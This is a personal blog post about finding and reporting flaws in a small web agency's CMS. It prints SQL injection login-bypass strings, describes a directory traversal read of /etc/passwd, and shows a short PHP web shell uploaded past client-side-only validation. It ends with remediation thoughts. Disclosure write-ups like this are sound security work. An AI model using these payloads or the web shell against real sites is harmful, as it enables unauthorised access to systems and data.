---
title:  "A Web Agency's Vulnerable Website"
date:   2016-01-23 00:00:00
description: One Fine Evening's Pastime
---

This article covers a company profile website. The company is owned by a friend of mine. He runs a web agency, offering his clients custom applications based on a CMS they developed. All of the things mentioned in this article has been reported to the agency to be fixed.

It should be noted not every version of their CMS is vulnerable. A later version of their CMS used in a SaaS business run by the same company is not vulnerable to the SQL injection on the admin login form and directory indexing.

#### How It Began

The story started in early November 2015. I found that [directory indexing](https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Directory_Indexing) was enabled on his web agency's company profile website. After looking at the files I could see, I found out the website's admin login page and the structure of their company's CMS.

Knowing that he's running another business, I tried checking out his other business' website. Directory indexing was not enabled in this site, but I found out that they're using the same CMS engine.

I notified him for the directory indexing on his web agency (we'll call it Alpha Web Agency), and told him that directory indexing leaked some information about the structure for his SaaS business' website (we'll call it Beta Online Services). It was fixed after a few days.

That's how I gain a little knowledge on their CMS structure, and how I could perform the next steps specifically on the admin panel.

#### Two Months Later

On a Saturday evening, I decided to come back to Alpha Web Agency's website. I didn't really expect to find anything there, I just want to kill some time while waiting for a software installation to finish.

I checked once again to make sure that directory indexing is not enabled on the site. After that, I went straight to the admin login form, as I already know the exact path.

I tried to use this login credentials on the login form.

```
Username: '
Password: '
```

The application gave me an unexpected response.

![Login Response](/assets/images/posts/alpha-web-agency-01.png)

The login form is vulnerable to SQL injection. I didn't try it when I went to Alpha Web Agency's site in November 2015. I tried to bypass the authentication sequence.

```
Username: ' OR 1=1--
Password: ' OR 1=1--
```

I still got the same response as before. So I tried another one.

```
Username: ' OR 1=1#
Password: ' OR 1=1#
```

And the admin panel is served.

![Admin Panel](/assets/images/posts/alpha-web-agency-02.png)

The navigation in the admin panel seems to be vulnerable to directory traversal, and I tried to insert the path to `/etc/passwd` file as the parameter value.

![Directory Traversal](/assets/images/posts/alpha-web-agency-03.png)

The admin can upload images in several menu functions. The image files should be limited to `jpg`, `gif`, and `png` files. But it's only validated with JavaScript, disabling the form submission button to be clicked when the script detected invalid file extension.

We can always disable JavaScript on modern browsers, and I successfully uploaded a PHP file.

![Upload Validation Bypass](/assets/images/posts/alpha-web-agency-04.png)

This is the file I uploaded.

```php
<?php
echo '<pre>';
echo shell_exec($_GET['cmd']);
echo '</pre>';
?>
```

The PHP configuration on the server prevents the `shell_exec` from running, but it should be possible to do other things with an uploaded PHP file.

Beta Online Services' website is not vulnerable to SQL injection on the login form. But it's possible that it also suffers from the directory traversal vulnerability and missing upload validation on the backend. Beta Online Services is started a few years after Alpha Web Agency, therefore I assume that it's using a newer version of the CMS. Hence, some of the vulnerabilities has been fixed for Beta Online Services' website.

#### Conclusion

The report regarding the existing vulnerabilities has been sent to Alpha Web Agency, and they should be on the process of patching it. But maybe we need to have some talk about how the vulnerabilities could exist.

It's a small company run mainly by the owner. The owner started out freelancing by himself, and after a while he started to build components for future projects. He ended up developing a CMS and templates for projects. After a while, he hired a few people to help with the projects and the company is formed.

The CMS and templates might be built with project timeline in mind, and focused mainly just to have the functions running. The company is a very small company with only around five workers including the owner himself. Their hands being full with keeping up with the clients' requests in tight deadlines might be one reason that they didn't have much time to review the security of their system. Not to mention that they're also need manpower to keep Beta Online Services running.

To prevent similar problems from appearing in the future, the company might need to spare some time reviewing their code, examining their server configurations, and testing their system's security. Maybe some more manpower will help, especially security-aware web developers and administrators.